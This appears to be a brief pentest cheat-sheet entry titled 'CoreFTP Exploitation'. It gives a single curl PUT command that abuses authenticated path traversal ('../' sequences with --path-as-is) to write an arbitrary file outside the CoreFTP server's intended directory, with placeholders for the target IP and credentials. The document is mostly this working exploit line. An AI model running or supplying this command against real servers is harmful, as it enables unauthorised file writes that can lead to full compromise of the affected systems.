
CoreFTP Exploitation
```shell-session
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

- Authenticated directory/path traversal
- Arbitrary file write